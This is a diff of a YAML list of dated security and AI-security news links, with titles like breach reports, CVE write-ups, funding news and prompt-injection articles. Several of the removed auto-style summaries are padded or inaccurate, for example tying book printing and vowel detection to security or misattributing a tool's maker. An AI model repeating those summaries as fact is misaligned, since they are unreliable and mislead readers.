+    link: https://www.tomshardware.com/tech-industry/cyber-security/russia-hacked-and-took-control-of-a-norwegian-dam-police-chief-claims-released-over-1-900-000-gallons-of-water-before-attack-was-noticed
+- date: '2025-08-18'
+  news-items:
+  - desc: 'BaxBench: Can LLMs Generate Secure and Correct Backends? Model ranking
+      for correctness and security.'
+    link: https://baxbench.com/
+  - desc: Securing Agents with Rules - Invariant Documentation
+    link: https://explorer.invariantlabs.ai/docs/guardrails/
+- date: '2025-08-15'
+  news-items:
+  - desc: Proxmox/Install Arch Linux as a guest - ArchWiki Omarchy Install
     link: https://wiki.archlinux.org/title/Proxmox/Install_Arch_Linux_as_a_guest
-  - desc: Case study examines how Wesley & Victor's security application was successfully
-      acquired by Bubble, providing insights into the no-code security startup ecosystem.
-      The acquisition highlights the growing market for accessible security tools
-      and platforms.
+  - desc: 🚪How Wesley & Victor's security app was acquired by Bubble
     link: https://nocodeexits.substack.com/p/how-wesley-and-victors-security-app
 - date: '2025-08-14'
   news-items:
-  - desc: Stripe and Circle compete for dominance in the stablecoin payments market,
-      with significant implications for digital finance infrastructure.
+  - desc: Stablecoin Wars With Stripe And Circle Racing To Control Payments
     link: https://www.forbes.com/sites/digital-assets/2025/08/13/stablecoin-wars-with-stripe-and-circle-racing-to-control-payments/?ref=bayarealetters.com
-  - desc: Comprehensive lessons learned from building effective AI hacker agents for
-      cybersecurity competitions and red teaming exercises.
+  - desc: Lessons learned building an AI hacker | AI Cyber Challenge
     link: https://theori.io/blog/building-effective-llm-agents-63446?utm_source=tldrinfosec
-  - desc: SplxAI introduces continuous red teaming platform for AI assistants and
-      agentic workflows to identify security vulnerabilities.
-    link: https://splx.ai/platform/probe
-  - desc: Design-focused cybersecurity firm combining creative approaches with security
-      expertise for innovative protection solutions.
-    link: https://www.miscreants.com/
-  - desc: Red team analysis reveals surprising weaknesses in OpenAI's GPT-5 model
-      through comprehensive security testing.
-    link: https://splx.ai/blog/gpt-5-red-teaming-results
-  - desc: Archive of AI Cyber Challenge competition resources and results from cybersecurity
-      competitions and research.
-    link: https://archive.aicyberchallenge.com/?
-  - desc: Analysis of how one-time passwords and modern authentication methods may
-      be creating worse security than traditional passwords.
-    link: https://blog.danielh.cc/blog/passwords
-  - desc: Developer's journey into writing Gleam programming language professionally
-      and its applications in secure systems.
-    link: https://www.youtube.com/watch?v=BfPRcanTWXA
-  - desc: KrebsOnSecurity featured in new HBO Max series highlighting cybersecurity
-      investigations and threat intelligence.
-    link: https://krebsonsecurity.com/2025/08/krebsonsecurity-in-new-most-wanted-hbo-max-series/
-  - desc: Analysis of emerging career opportunities in AI security as organizations
-      prioritize secure artificial intelligence implementations.
-    link: https://www.darkreading.com/cybersecurity-operations/will-secure-ai-hottest-career-path-cybersecurity
-  - desc: 1Password integrates with Trelica to streamline access reviews and improve
-      identity governance workflows.
-    link: https://blog.1password.com/simplify-access-reviews-with-trelica-by-1password/
-  - desc: North American venture capital firms increase investments in Israeli cybersecurity
-      startups following major acquisitions.
-    link: https://pitchbook.com/news/articles/the-wiz-effect-north-american-vcs-crowd-into-israels-cybersecurity-scene
-  - desc: Financial analysis of capital requirements for cybersecurity companies pursuing
-      public offerings and market valuations.
-    link: https://strategyofsecurity.com/p/how-much-capital-does-it-take-for-a-cybersecurity-company-to-go-public
-  - desc: Simon Willison presents his 'Lethal Trifecta' framework for AI security
-      at Bay Area AI Security Meetup.
-    link: https://simonwillison.net/2025/Aug/9/bay-area-ai/
-  - desc: Critical vulnerability discovered in Claude AI allowing inverse prompt attacks
-      and potential data extraction.
-    link: https://cymulate.com/blog/cve-2025-547954-54795-claude-inverseprompt/
-- date: '2025-08-03'
+- date: '2025-08-13'
   news-items:
-  - desc: RunReveal launches AI Chat for Security Investigations to enhance threat
-      detection and response capabilities.
-    link: https://blog.runreveal.com/introducing-runreveal-ai-chat/
-  - desc: Analysis of the hidden challenges in staff engineering roles, including
-      lack of transparency and uncertainty in career progression.
-    link: https://substack.com/@scottbehrens/p-169380048
-  - desc: Chris Sanders presents a standard for creating human-centered investigation
-      playbooks for security teams.
-    link: https://chrissanders.org/2025/06/human-centered-playbooks/
-  - desc: BlinkOps secures $50M funding for its micro agent cybersecurity platform
-      to enhance automated threat response.
-    link: https://www.calcalistech.com/ctechnews/article/hjwr1jhvge
-  - desc: Comprehensive guide for building effective cloud security roadmaps and implementation
-      strategies.
-    link: https://open.substack.com/pub/groundedcloudsecurity/p/building-a-cloud-security-roadmap?r=1xgaxy&utm_medium=ios
-  - desc: Palo Alto Networks acquires CyberArk for $25 billion in major cybersecurity
-      consolidation move.
-    link: https://www.ibtimes.co.uk/cyberark-acquired-palo-alto-networks-25-billion-more-details-deal-expanded-offering-1739774
-  - desc: Guide for printing books at home using minimal equipment and resources for
-      security documentation.
-    link: https://huijzer.xyz/posts/98
-  - desc: Drata shares best practices for successfully rolling out AI coding assistants
-      in enterprise security environments.
-    link: https://www.augmentcode.com/blog/rolling-out-ai-coding-assistants-how-drata-did-it
-  - desc: Kali Linux now supports Apple containers on macOS systems, expanding penetration
-      testing capabilities.
-    link: https://www.bleepingcomputer.com/news/security/kali-linux-can-now-run-in-apple-containers-on-macos-systems/
-  - desc: ACM article examining how AI is democratizing cybercrime and lowering barriers
-      for malicious actors.
-    link: https://cacm.acm.org/blogcacm/ai-and-the-democratization-of-cybercrime/
-  - desc: SentinelOne analysis of China's covert cyber capabilities, focusing on the
-      Hafnium group's advanced tactics.
-    link: https://www.sentinelone.com/labs/chinas-covert-capabilities-silk-spun-from-hafnium/
-  - desc: Digital Digging investigation reveals ChatGPT confession vulnerabilities
-      and privacy concerns.
+  - desc: 'SplxAI: Continuous Red Teaming for AI Assistants and Agentic Workflows'
+    link: https://splx.ai/platform/probe
+  - desc: Miscreants | Design + Cybersecurity
+    link: https://www.miscreants.com/
+  - desc: 'GPT-5 Under Fire: Red Teaming OpenAI’s Latest Model Reveals Surprising
+      Weaknesses | SplxAI Blog'
+    link: https://splx.ai/blog/gpt-5-red-teaming-results
+  - desc: AIxCC Competition Archive | AIxCC Competition Archive
+    link: https://archive.aicyberchallenge.com/?
+  - desc: We replaced passwords with something worse | Blog - Daniel Huang Onetime
+      password.
+    link: https://blog.danielh.cc/blog/passwords
+  - desc: How I ended up writing Gleam for a living - Isaac Harris-Holt | Code BEAM
+      Lite STO 2025 Gleam programming language.
+    link: https://www.youtube.com/watch?v=BfPRcanTWXA
+  - desc: KrebsOnSecurity in New ‘Most Wanted’ HBO Max Series
+    link: https://krebsonsecurity.com/2025/08/krebsonsecurity-in-new-most-wanted-hbo-max-series/
+- date: '2025-08-12'
+  news-items:
+  - desc: Will Secure AI Be the Hottest Career Path in Cybersecurity?
+    link: https://www.darkreading.com/cybersecurity-operations/will-secure-ai-hottest-career-path-cybersecurity
+- date: '2025-08-11'
+  news-items:
+  - desc: Simplify access reviews with Trelica by 1Password | 1Password
+    link: https://blog.1password.com/simplify-access-reviews-with-trelica-by-1password/
+  - desc: '''The Wiz effect'': North American VCs crowd into Israel''s cybersecurity
+      scene'
+    link: https://pitchbook.com/news/articles/the-wiz-effect-north-american-vcs-crowd-into-israels-cybersecurity-scene
+  - desc: How Much Capital Does It Take for a Cybersecurity Company to Go Public?
+    link: https://strategyofsecurity.com/p/how-much-capital-does-it-take-for-a-cybersecurity-company-to-go-public
+  - desc: My Lethal Trifecta talk at the Bay Area AI Security Meetup
+    link: https://simonwillison.net/2025/Aug/9/bay-area-ai/
+- date: '2025-08-07'
+  news-items:
+  - desc: 'CVE-2025-547954/54795: Claude InversePrompt Vulnerability'
+    link: https://cymulate.com/blog/cve-2025-547954-54795-claude-inverseprompt/
+  - desc: OpenAI GPT OSS 20B Red Teaming Competition
+    link: https://www.kaggle.com/competitions/openai-gpt-oss-20b-red-teaming/?utm_source=newsletter.danielmiessler.com&utm_medium=newsletter&utm_campaign=unsupervised-learning-no-492&_bhlid=d7856edc49cd864706cb03e8c36016f5395a48ea
+  - desc: BlackHat 2025 Cybersecurity Threat Detection - Juliet Sai LinkedIn
+    link: https://www.linkedin.com/posts/julietsai_blackhat2025-cybersecurity-threatdetection-activity-7356772585998635008-adjc?utm_source=share&utm_medium=member_ios&rcm=ACoAAAAxexYBAxHYXXLEKrVZU2fIGa5ALdj96_s
+  - desc: Claude AI Twitter - Code Block Prompt Command
+    link: https://x.com/claudeai/status/1953125698081833346?s=46
+  - desc: DefCon Security Research Tweet
+    link: https://x.com/mbrg0/status/1953454988945965192?s=46
+  - desc: GPT OSS Security Analysis - Simon Willison
+    link: https://simonwillison.net/2025/Aug/5/gpt-oss/
+- date: '2025-08-05'
+  news-items:
+  - desc: Aim Labs | CurXecute Blogpost
+    link: https://www.aim.security/lp/aim-labs-curxecute-blogpost
+  - desc: 💰 Security, Funded - Back in Black(jack) $VRNS is a BULL!!
+    link: https://www.returnonsecurity.com/p/security-funded-205
+  - desc: Vibe Coding Conundrums
+    link: https://www.resilientcyber.io/p/vibe-coding-conundrums
+  - desc: 'A summer of security: empowering cyber defenders with AI Auto Security
+      Agents!'
+    link: https://blog.google/technology/safety-security/cybersecurity-updates-summer-2025/?ref=aisecret.us
+  - desc: 'Breaking NVIDIA Triton: CVE-2025-23319 - A Vulnerability Chain Leading
+      to AI Server Takeover | Wiz Blog'
+    link: https://www.wiz.io/blog/nvidia-triton-cve-2025-23319-vuln-chain-to-ai-server?utm_source=tldrinfosec
+- date: '2025-08-02'
+  news-items:
+  - desc: Link
     link: https://www.digitaldigging.org/p/chatgpt-confessions-gone-they-are
-  - desc: Yoshua Bengio's comprehensive chapter on AI security and safety considerations
-      for enterprise deployment.
+  - desc: security and safety chapter
     link: https://x.com/yoshua_bengio/status/1951263049735664120?s=46
+- date: '2025-08-01'
+  news-items:
+  - desc: Printing a Book at Home with Minimal Equipment
+    link: https://huijzer.xyz/posts/98
+  - desc: 'Rolling Out AI Coding Assistants: How Drata Did It'
+    link: https://www.augmentcode.com/blog/rolling-out-ai-coding-assistants-how-drata-did-it
+  - desc: Kali Linux can now run in Apple containers on macOS systems
+    link: https://www.bleepingcomputer.com/news/security/kali-linux-can-now-run-in-apple-containers-on-macos-systems/
+  - desc: AI and the Democratization of Cybercrime
+    link: https://cacm.acm.org/blogcacm/ai-and-the-democratization-of-cybercrime/
+  - desc: China’s Covert Capabilities | Silk Spun From Hafnium Hafnium
+    link: https://www.sentinelone.com/labs/chinas-covert-capabilities-silk-spun-from-hafnium/
+- date: '2025-07-31'
+  news-items:
+  - desc: CyberArk Acquired By Palo Alto Networks for $25 Billion
+    link: https://www.ibtimes.co.uk/cyberark-acquired-palo-alto-networks-25-billion-more-details-deal-expanded-offering-1739774
+- date: '2025-07-30'
+  news-items:
+  - desc: A Standard for Human-Centered Investigation Playbooks | Chris Sanders
+    link: https://chrissanders.org/2025/06/human-centered-playbooks/
+  - desc: BlinkOps secures $50M for its micro agent cyber platform
+    link: https://www.calcalistech.com/ctechnews/article/hjwr1jhvge
+  - desc: Link
+    link: https://open.substack.com/pub/groundedcloudsecurity/p/building-a-cloud-security-roadmap?r=1xgaxy&utm_medium=ios
+- date: '2025-07-29'
+  news-items:
+  - desc: AI Chat for Security Investigations | RunReveal Blog
+    link: https://blog.runreveal.com/introducing-runreveal-ai-chat/
+  - desc: 'The Hidden Downsides of Staff Engineering: Opaqueness and Uncertainty'
+    link: https://substack.com/@scottbehrens/p-169380048
 - date: '2025-07-28'
   news-items:
-  - desc: HeroDevs launches Open Source Sustainability Fund to provide security patches
-      for end-of-life open source software.
+  - desc: Open Source Sustainability Fund | HeroDevs End of Life Open Source software
+      patches!
     link: https://www.herodevs.com/sustainability-fund
-  - desc: Haicker introduces AI-powered penetration testing tool with integrated GitHub
-      functionality.
+  - desc: Haicker AI Pentester Integrated with Github.
     link: https://haicker.app/
-  - desc: CrowdStrike reflects on building resilience by design and deploys a chief
-      resilience officer to strengthen organizational security.
+  - desc: Reflecting on Building Resilience by Design | CrowdStrike Crowdstrike Deploys
+      a chief resilience officer!
     link: https://www.crowdstrike.com/en-us/blog/reflecting-on-building-resilience-by-design/
-  - desc: Dating safety app Tea suffers data breach exposing 72,000 user images.
-    link: https://techcrunch.com/2025/07/26/dating-safety-app-tea-breached-exposing-72000-user-images/
-  - desc: Analysis of AI capabilities and challenges in generating secure code for
-      software development.
-    link: https://www.lawfaremedia.org/article/ai-and-secure-code-generation
-  - desc: Security researchers demonstrate actionable privilege escalation techniques
-      against GitHub Copilot.
-    link: https://research.eye.security/how-we-rooted-copilot/
-  - desc: Review and analysis of the 2025 Cyber 150 list of top cybersecurity companies.
-    link: https://stiennon.substack.com/p/checking-in-on-the-2025-cyber-150
-  - desc: Discussion on the importance of verifiable cloud systems for enhanced security
-      and trust.
-    link: https://x.com/dhh/status/1949567874106065214
-  - desc: Google Cloud Security announces presence and demonstrations at Black Hat
-      security conference.
-    link: https://cloud.google.com/resources/security-black-hat-2025
-  - desc: AWS introduces Stratus Red Team tool for cloud-based adversary simulation
-      and security testing.
-    link: https://stratus-red-team.cloud/attack-techniques/AWS/
-  - desc: Deceptiq releases comprehensive Cyber Deception Maturity Model assessment
-      framework for organizations.
-    link: https://deceptiq.com/blog/cyber-deception-maturity-model
-  - desc: Weekly compilation of the best information security long-form articles and
-      analysis for July 19, 2025.
-    link: https://www.metacurity.com/best-infosec-related-long-reads-for-the-week-of-7-19-25/
-  - desc: Indian cryptocurrency exchange CoinDCX confirms $44 million theft following
-      security breach.
-    link: https://techcrunch.com/2025/07/21/indian-crypto-exchange-coindcx-confirms-44-million-stolen-during-hack/
-  - desc: Anne Arundel Dermatology reports data breach affecting 1.9 million patients'
-      personal information.
-    link: https://securityaffairs.com/180100/data-breach/anne-arundel-dermatology-data-breach-impacts-1-9-million-people.html
-  - desc: Wiz researchers discover critical NVIDIA AI vulnerability (CVE-2025-23266)
-      affecting GPU computing environments.
-    link: https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascaped
-  - desc: Cybersecurity startup Deep Algorithm secures Rs 10.8 crores in seed funding
-      round.
-    link: https://startupnews.fyi/2025/07/17/cybersecurity-startup-deep-algorithm-raises-rs-10-8-cr-in-seed-round/
-  - desc: New AI agent platform Cogent launched to streamline vulnerability management
-      processes.
-    link: https://greylock.com/portfolio-news/introducing-cogent-ai-agents-for-vulnerability-management/
-  - desc: Guidelines and best practices for making the first security hire in growing
-      organizations.
-    link: https://ramimac.me/start-security
-  - desc: Google announces AI-powered security initiatives to empower cyber defenders
-      and enhance threat detection capabilities.
-    link: https://blog.google/technology/safety-security/cybersecurity-updates-summer-2025/
-- date: '2025-07-21'
+  - desc: Dating safety app Tea breached, exposing 72,000 user images
+    link: https://techcrunch.com/2025/07/26/dating-safety-app-tea-breached-exposing-72000-user-images/?
+  - desc: AI and Secure Code Generation
+    link: https://www.lawfaremedia.org/article/ai-and-secure-code-generation?utm_source=tldrinfosec
+  - desc: How we Rooted Copilot Actionable use of scripts to elevate privileges
+    link: https://research.eye.security/how-we-rooted-copilot/?utm_source=tldrinfosec
+- date: '2025-07-27'
   news-items:
-  - desc: McDonald's AI security vulnerability analysis reveals critical flaws including
-      authentication bypass via default credentials, authorization issues allowing
-      cross-account data access, and poor account lifecycle management with dormant
-      2019 test accounts remaining active.
+  - desc: Checking in on the 2025 Cyber 150
+    link: https://stiennon.substack.com/p/checking-in-on-the-2025-cyber-150?utm_source=substack&utm_medium=email
+  - desc: Thread by @dhh A case for verifiable cloud systems
+    link: https://x.com/dhh/status/1949567874106065214
+  - desc: Google Cloud Security is at Black Hat
+    link: https://cloud.google.com/resources/security-black-hat-2025
+- date: '2025-07-26'
+  news-items:
+  - desc: Best infosec-related long reads for the week of 7/19/25
+    link: https://www.metacurity.com/best-infosec-related-long-reads-for-the-week-of-7-19-25/?ref=metacurity-newsletter
+- date: '2025-07-25'
+  news-items:
+  - desc: AWS - Stratus Red Team
+    link: https://stratus-red-team.cloud/attack-techniques/AWS/
+  - desc: 'Cyber Deception Maturity Model: Complete Assessment Framework | Deceptiq'
+    link: https://deceptiq.com/blog/cyber-deception-maturity-model?utm_source=tldrinfosec
+- date: '2025-07-24'
+  news-items:
+  - desc: Indian crypto exchange CoinDCX confirms $44M stolen during hack
+    link: https://techcrunch.com/2025/07/21/indian-crypto-exchange-coindcx-confirms-44-million-stolen-during-hack/?utm_source=tldrinfosec
+- date: '2025-07-22'
+  news-items:
+  - desc: Anne Arundel Dermatology data breach impacts 1.9 million people
+    link: https://securityaffairs.com/180100/data-breach/anne-arundel-dermatology-data-breach-impacts-1-9-million-people.html
+  - desc: NVIDIAScape - NVIDIA AI Vulnerability (CVE-2025-23266) | Wiz Blog
+    link: https://www.wiz.io/blog/nvidia-ai-vulnerability-cve-2025-23266-nvidiascaped
+  - desc: Cybersecurity startup Deep Algorithm raises Rs 10.8 Cr in seed round
+    link: https://startupnews.fyi/2025/07/17/cybersecurity-startup-deep-algorithm-raises-rs-10-8-cr-in-seed-round/
+  - desc: 'Introducing Cogent: AI Agents for Vulnerability Management AI Agents'
+    link: https://greylock.com/portfolio-news/introducing-cogent-ai-agents-for-vulnerability-management/
+  - desc: The First Security Hire Rule of Thumb
+    link: https://ramimac.me/start-security
+  - desc: 'A summer of security: empowering cyber defenders with AI Google Secure
+      AI'
+    link: https://blog.google/technology/safety-security/cybersecurity-updates-summer-2025/
+- date: '2025-07-19'
+  news-items:
+  - desc: Lessons Learned From McDonald's Big AI Flub Basic security failure -- Authentication
+      bypass via default credentials, Authorization flaws allowing cross-account data
+      access, Poor account lifecycle management (dormant 2019 test accounts still
+      active), Insecure direct object references (manipulable applicant IDs), Lack
+      of access monitoring and alerting. Original write-up.
     link: https://www.darkreading.com/application-security/lessons-learned-mcdonalds-ai-flub
-  - desc: Palantir releases comprehensive security documentation with markings system
-      for data classification and access control in enterprise environments.
+  - desc: Lessons Learned From McDonald's Big AI Flub Basic security failure -- Authentication
+      bypass via default credentials, Authorization flaws allowing cross-account data
+      access, Poor account lifecycle management (dormant 2019 test accounts still
+      active), Insecure direct object references (manipulable applicant IDs), Lack
+      of access monitoring and alerting. Original write-up.
+    link: https://ian.sh/mcdonalds
+- date: '2025-07-17'
+  news-items:
+  - desc: Palantir Security with Markings
     link: https://www.palantir.com/docs/foundry/security/markings
-  - desc: MindFort emerges as Y Combinator startup developing autonomous security
-      agents for automated threat detection and response operations.
+  - desc: 'MindFort: Autonomous Security Agents'
     link: https://www.ycombinator.com/companies/mindfort
-  - desc: Cotool launches AI-powered agents specifically designed for security operations
-      teams, focusing on detection engineering and automated incident response.
+  - desc: 'Cotool: AI Agents for Security Operations Teams Detection Engineering yc'
     link: https://www.ycombinator.com/companies/cotool
-  - desc: Google Gemini AI vulnerability discovered allowing attackers to embed invisible
-      malicious prompts that bypass security filters and content moderation systems.
+  - desc: Google Gemini AI Bug Allows Invisible, Malicious Prompts
     link: https://www.darkreading.com/remote-workforce/google-gemini-ai-bug-invisible-malicious-prompts
-  - desc: Go programming language introduces FIPS 140-3 certified cryptographic module
-      for government and enterprise applications requiring validated security standards.
-    link: https://go.dev/blog/fips140
-  - desc: Grok-4 AI model successfully compromised through jailbreak techniques just
-      two days after its official release, highlighting ongoing AI safety challenges.
+  - desc: The FIPS 140-3 Go Cryptographic Module - The Go Programming Language
+    link: https://go.dev/blog/fips140?utm_source=tldrinfosec
+- date: '2025-07-15'
+  news-items:
+  - desc: Grok-4 Falls to a Jailbreak Two Days After Its Release
     link: https://www.securityweek.com/grok-4-falls-to-a-jailbreak-two-days-after-its-release/
-  - desc: Virtru data security startup secures $50 million in funding to expand their
-      data protection and privacy solutions for enterprise customers.
+  - desc: Data security startup Virtru raises $50M in funding
     link: https://siliconangle.com/2025/07/11/data-security-startup-virtru-raises-50m-funding/
-  - desc: Advanced techniques for covertly hiding files in modern Linux systems demonstrated,
-      showcasing sophisticated methods for persistence and stealth operations.
+- date: '2025-07-13'
+  news-items:
+  - desc: Link
+    link: https://x.com/midwestneil/status/1943708133421101446?s=46
+  - desc: Link
     link: https://haxrob.net/hiding-in-plain-sight-part-3-covertly-hiding-files-in-modern-linux-2/
-  - desc: PerfektBlue attack vector discovered affecting millions of vehicles, enabling
-      remote hacking capabilities through automotive system vulnerabilities.
-    link: https://www.securityweek.com/millions-of-cars-exposed-to-remote-hacking-via-perfektblue-attack/
+- date: '2025-07-11'
+  news-items:
+  - desc: Millions of Cars Exposed to Remote Hacking via PerfektBlue Attack
+    link: https://www.securityweek.com/millions-of-cars-exposed-to-remote-hacking-via-perfektblue-attack/?utm_source=tldrinfosec
 - date: '2025-07-09'
   news-items:
-  - desc: Wiz releases comprehensive coding rules file for safer development practices,
-      providing security guidelines for application development and vulnerability
-      prevention.
-    link: https://www.wiz.io/blog/safer-vibe-coding-rules-files
-  - desc: Cloud Security Alliance publishes Secure Vibe Coding Guide, empowering citizen
-      developers with essential security best practices and development patterns.
-    link: https://cloudsecurityalliance.org/blog/2025/04/09/secure-vibe-coding-guide
-  - desc: LevelBlue announces acquisition of Trustwave, positioning itself as the
-      largest pure-play managed security services provider in the cybersecurity market.
-    link: https://www.trustwave.com/en-us/company/newsroom/news/levelblue-to-acquire-trustwave-becoming-largest-pure-play-managed-security-services-provider/
-  - desc: Critical vulnerabilities CVE-2025-53109 and CVE-2025-53110 discovered in
-      Anthropic's EscapeRoute system, highlighting security risks in AI infrastructure.
-    link: https://cymulate.com/blog/cve-2025-53109-53110-escaperoute-anthropic/
-  - desc: Daniel Miessler introduces Substrate, a new security framework for threat
-      detection and incident response automation.
-    link: https://danielmiessler.com/blog/introducing-substrate
-  - desc: Sophos demonstrates how artificial intelligence can be leveraged to identify
-      cybercrime masterminds through advanced pattern recognition and behavioral analysis.
-    link: https://news.sophos.com/en-us/2025/06/30/using-ai-to-identify-cybercrime-masterminds/
-  - desc: AWS tutorial demonstrating how to create and manage security team permissions
-      in IAM Identity Center for enhanced cloud security governance.
-    link: https://www.youtube.com/watch?v=914HljkRPDk
-  - desc: XBOW secures $75 million Series B funding to advance AI-powered cybersecurity
-      solutions and autonomous threat detection capabilities.
-    link: https://xbow.com/
-  - desc: CloudPEASS open-source tool provides comprehensive cloud security assessments
-      across multiple cloud platforms and services.
-    link: https://github.com/carlospolop/CloudPEASS
-  - desc: TriageMCP provides an open-source MCP server for static PE analysis, enabling
-      malware triage and security analysis capabilities.
-    link: https://github.com/eversinc33/TriageMCP
-  - desc: Zero-click AI vulnerability discovered in Microsoft 365 Copilot allows data
-      exposure through malicious email attachments with hidden extraction commands.
-    link: https://hackread.com/zero-click-ai-flaw-microsoft-365-copilot-expose-data/
-  - desc: Comprehensive threat modeling framework for cloud service providers addresses
-      evolving security challenges in 2025 cloud environments.
-    link: https://www.chrisfarris.com/post/threat-model-2025/
-  - desc: Kubernetes Security Posture Management (KSPM) practitioner's guide provides
-      comprehensive security implementation strategies for containerized environments.
-    link: https://www.paloaltonetworks.com/blog/cloud-security/kubernetes-a-practitioners-guide-to-kspm/
-  - desc: Guardz secures $56M Series B funding to advance cybersecurity solutions
-      for small and medium businesses through AI-powered threat detection.
-    link: https://www.axios.com/pro/enterprise-software-deals/2025/06/09/exclusive-guardz-locks-up-56m-series-b-for-cybersecurity
-  - desc: Design patterns for securing LLM agents against prompt injection attacks
-      provide layered defense strategies for AI system protection.
-    link: https://simonwillison.net/2025/Jun/13/prompt-injection-design-patterns/
-  - desc: Efficient string processing algorithms for vowel detection demonstrate optimization
-      techniques applicable to security pattern matching.
-    link: https://austinhenley.com/blog/vowels.html
-  - desc: SHADE-Arena framework evaluates sabotage and monitoring capabilities in
-      LLM agents, providing benchmarks for AI security assessment.
-    link: https://www.anthropic.com/research/shade-arena-sabotage-monitoring
-  - desc: Privacy course for security professionals covers three types of data leakage
-      and provides practical privacy protection strategies.
-    link: https://learn.justhacking.com/courses/79c56405-5f89-4533-a46c-f8de37300749/take/3-types-of-leakage
-  - desc: Trust engineering framework enables security leadership at early-stage startups
-      by focusing on business-aligned security practices.
-    link: https://www.returnonsecurity.com/p/trust-engineering-building-security-leadership
-  - desc: Integris IT expands managed security services through strategic acquisitions
-      of TechMD and 1ntegersecurity.
-    link: https://integrisit.com/
-  - desc: CL4R1T4S repository provides system prompt transparency across major AI
-      platforms including ChatGPT, Gemini, and Claude.
-    link: https://github.com/elder-plinius/CL4R1T4S
-  - desc: CloudRec delivers open-source multi-cloud security posture management platform
-      for comprehensive cloud environment security assessment.
-    link: https://github.com/antgroup/CloudRec
-  - desc: Google's layered defense strategy provides comprehensive approach to mitigating
-      prompt injection attacks in AI systems.
-    link: https://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html
-  - desc: Bluetooth security vulnerabilities enable unauthorized microphone access,
-      allowing attackers to conduct surveillance through compromised devices.
-    link: https://www.bleepingcomputer.com/news/security/bluetooth-flaws-could-let-hackers-spy-through-your-microphone/
-  - desc: Security OKRs framework provides actionable guidance for security teams
-      to establish measurable objectives and key results.
-    link: https://alsmola.medium.com/building-effective-security-okrs-94f249230a39
-  - desc: Qilin ransomware attack on NHS healthcare systems results in patient death,
-      highlighting critical infrastructure vulnerability impacts.
-    link: https://hackread.com/qilin-ransomware-attack-nhs-causes-patient-death-uk/
-  - desc: Wiz demonstrates fine-tuning small language models for secrets detection
-      in code repositories, advancing automated security scanning capabilities.
-    link: https://www.wiz.io/blog/small-language-model-for-secrets-detection-in-code
-  - desc: Colombian Navy intercepts Starlink-powered drone narco-submarine, highlighting
-      emerging threats in autonomous smuggling operations.
+  - desc: Fine-Tuning a Small Language Model for Secrets Detection | Wiz Blog
+    link: https://www.wiz.io/blog/small-language-model-for-secrets-detection-in-code?utm_source=tldrinfosec
+  - desc: Starlink-powered drone narco-sub intercepted by Colombian Navy — boat was
+      converted into a drone for uncrewed smuggling
     link: https://www.tomshardware.com/tech-industry/starlink-powered-drone-narco-sub-intercepted-by-colombian-navy-boat-was-converted-into-a-drone-for-uncrewed-smuggling
+- date: '2025-07-07'
+  news-items:
+  - desc: Rules file from Wiz.
+    link: https://www.wiz.io/blog/safer-vibe-coding-rules-files
+  - desc: Secure Vibe Coding Guide | Become a Citizen Developer | CSA
+    link: https://cloudsecurityalliance.org/blog/2025/04/09/secure-vibe-coding-guide
+  - desc: LevelBlue to Acquire Trustwave, Becoming Largest Pure-Play Managed Security
+      Services Provider
+    link: https://www.trustwave.com/en-us/company/newsroom/news/levelblue-to-acquire-trustwave-becoming-largest-pure-play-managed-security-services-provider/
+- date: '2025-07-06'
+  news-items:
+  - desc: Link
+    link: https://www.bellingcat.com/resources/how-tos/2025/06/06/have-llms-finally-mastered-geolocation/
+  - desc: substrate
+    link: https://danielmiessler.com/blog/introducing-substrate
+  - desc: AI to substrate criminals
+    link: https://news.sophos.com/en-us/2025/06/30/using-ai-to-identify-cybercrime-masterminds/
+- date: '2025-07-05'
+  news-items:
+  - desc: Creating Security Team Permissions in IAM Identity Center
+    link: https://www.youtube.com/watch?v=914HljkRPDk
+- date: '2025-07-01'
+  news-items:
+  - desc: XBOW 75M Series B,
+    link: https://xbow.com/
+- date: '2025-06-30'
+  news-items:
+  - desc: Bluetooth flaws could let hackers spy through your microphone BT pwned.
+    link: https://www.bleepingcomputer.com/news/security/bluetooth-flaws-could-let-hackers-spy-through-your-microphone/?utm_source=tldrinfosec
+  - desc: Building effective security OKRs Simple OKRs for Security Teams.
+    link: https://alsmola.medium.com/building-effective-security-okrs-94f249230a39
+  - desc: Qilin Ransomware Attack on NHS Causes Patient Death in the UK Hacks causing
+      human impact.
+    link: https://hackread.com/qilin-ransomware-attack-nhs-causes-patient-death-uk/?utm_source=tldrinfosec
+- date: '2025-06-24'
+  news-items:
+  - desc: 'antgroup/CloudRec: CloudRec is an open source multi-cloud security posture
+      management (CSPM) platform designed to help organizations improve the security
+      of their cloud environments. CloudRec is an open source multi-cloud security
+      posture management (CSPM) platform designed to help organizations improve the
+      security of their cloud environments.'
+    link: https://github.com/antgroup/CloudRec?utm_source=tldrinfosec
+  - desc: Mitigating prompt injection attacks with a layered defense strategy
+    link: https://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html?utm_source=tldrinfosec
+- date: '2025-06-23'
+  news-items:
+  - desc: 'Trust Engineering: Building Security Leadership at Early-Stage Startups
+      Trust Engineering" is a strategic approach for security leaders in early-stage
+      B2B SaaS startups, emphasizing the role as a business function rather than solely
+      a technical one.'
+    link: https://www.returnonsecurity.com/p/trust-engineering-building-security-leadership
+  - desc: Empowering people through technology Just bought TechMD and 1ntegersecurity
+      to expand its MSP business
+    link: https://integrisit.com/
+  - desc: Empowering people through technology Just bought TechMD and 1ntegersecurity
+      to expand its MSP business
+    link: https://www.techmd.com/
+  - desc: Empowering people through technology Just bought TechMD and 1ntegersecurity
+      to expand its MSP business
+    link: https://1ntegersecurity.com/
+  - desc: 'elder-plinius/CL4R1T4S: SYSTEM PROMPT TRANSPARENCY FOR ALL - CHATGPT, GEMINI,
+      GROK, CLAUDE, PERPLEXITY, CURSOR, WINDSURF, DEVIN, REPLIT, AND MORE! Repository
+      of Leaked System Prompts , additional repos 1, 2 and 3 and Benchmarking Prompt
+      Engineering Techniques for Secure Code'
+    link: https://github.com/elder-plinius/CL4R1T4S
+  - desc: 'elder-plinius/CL4R1T4S: SYSTEM PROMPT TRANSPARENCY FOR ALL - CHATGPT, GEMINI,
+      GROK, CLAUDE, PERPLEXITY, CURSOR, WINDSURF, DEVIN, REPLIT, AND MORE! Repository
+      of Leaked System Prompts , additional repos 1, 2 and 3 and Benchmarking Prompt
+      Engineering Techniques for Secure Code'
+    link: https://github.com/x1xhlol/system-prompts-and-models-of-ai-tools
